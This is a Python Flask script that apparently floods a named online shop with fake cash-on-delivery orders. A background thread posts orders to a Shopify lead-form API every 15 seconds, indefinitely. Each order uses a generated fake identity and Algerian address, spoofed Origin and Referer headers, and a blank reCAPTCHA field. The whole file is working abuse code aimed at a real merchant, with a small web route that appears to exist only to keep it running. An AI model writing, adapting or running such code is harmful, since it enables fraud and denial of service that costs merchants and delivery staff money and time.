from flask import Flask
from RNA import go
import requests
import time
import threading

app = Flask(__name__)

def send_order():
    person = go()

    url = "https://api.leadform-cod.com/remix/order"

    data = {
        "shop": "qww0t5-mc.myshopify.com",
        "country": "DZ",
        "country_code": "DZ",
        "product_id": "8842497360029",
        "variant_id": "47657885630621",
        "quantity": "3",
        "draft_id": "1019017658525",
        "is_recover": "0",
        "line_items[0][product_id]": "8842497360029",
        "line_items[0][variant_id]": "47657885630621",
        "line_items[0][quantity]": "3",
        "line_items[0][title]": "🌙-مجموعة-التحصين-بالمسك-الأسود",
        "line_items[0][name]": "🌙-مجموعة-التحصين-بالمسك-الأسود - Default Title",
        "line_items[0][price]": "450000",
        "line_items[0][variant_title]": "Default Title",
        "bundle_discount": '{"type":"price","value":3500,"title":"New offer","original_total":13500,"discounted_total":10000,"discount_amount":3500,"productId":"8842497360029"}',

        "first_name": person["first_name"],
        "last_name": person["last_name"],
        "phone": person["phone"],
        "city": person["address"]["city"],
        "province": person["address"]["province_name"],
        "province_code": person["address"]["province_code"],

        "email": "",
        "address1": "",
        "address2": "",
        "city_code": "",
        "zip": "",
        "note": "",
        "url": "https://chikhnasser.online/products/...",
        "newsletter": "false",
        "shipping_price": "0",
        "shipping_option": "Free Shipping",
        "discount_code": "",
        "discount_amount": "0",
        "discount_type": "price",
        "discount_value": "3500",
        "custom_fields": "[]",
        "g-recaptcha-response": "",
        "fbc": "",
        "fbp": "",
        "ttp": "",
        "ttclid": "",
    }

    headers = {
        "Origin": "https://chikhnasser.online",
        "Referer": "https://chikhnasser.online/",
    }

    response = requests.post(url, data=data, headers=headers)
    print(response.status_code)
    return response


def loop_requests():
    while True:
        try:
            req = send_order()
            if req.status_code == 200:
                print("send +")
        except Exception as e:
            print("error:", e)

        time.sleep(15)


@app.route("/")
def home():
    return "Hello"


if __name__ == "__main__":
    t = threading.Thread(target=loop_requests)
    t.daemon = True
    t.start()

    app.run(host="0.0.0.0", port=5000)
